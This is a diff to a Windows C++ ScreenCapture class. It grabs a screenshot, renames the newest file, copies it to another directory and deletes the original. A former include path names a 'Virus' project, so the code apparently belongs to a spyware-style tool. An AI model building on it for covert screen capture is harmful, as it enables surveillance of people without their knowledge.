@@ -1,13 +1,14 @@
 #pragma once
 
 #include "ScreenCapture.hpp"
+#include "PublicFunctions.hpp"
 #include <windows.h>
 #include <filesystem>
 #include <string>
 #include <fstream>
 #include <expected>
 #include <userenv.h>
-#include "../../../vs/Virus/PublicFunctions.hpp"
+#include <thread>
 
 namespace fs = std::filesystem;
 
@@ -63,8 +64,7 @@ std::string ScreenCapture::GetUserDirectory()
         GetEnvironmentVariable(name, buffer, result);
     }
     std::wstring temp = buffer;
-    std::string folderDirectory = PublicFunctions::WStringToString(temp) + SCREENSHOT_FOLDER;
-    return folderDirectory;
+    return PublicFunctions::WStringToString(temp);
 }
 
 int ScreenCapture::CreateScreenshotFolder()
@@ -113,14 +113,17 @@ std::string ScreenCapture::CreateFileName()
     return fileName;
 }
 
-
-
 int ScreenCapture::TakeScreenShot()
 {
     CreateScreenShot();
+    std::this_thread::sleep_for(std::chrono::milliseconds(200));
     std::string folderDirectory = GetUserDirectory() + SCREENSHOT_FOLDER;
+    std::string fileName = PublicFunctions::GetLastCreatedFile(folderDirectory);
+    std::string newFileName = CreateFileName();
+    fs::rename(fileName, folderDirectory + newFileName);
+    fs::copy(folderDirectory + newFileName, directory);
+    fs::remove(fileName);
     return 0;
-
 }
 
 int ScreenCapture::StartScreenCapture(uint32_t)
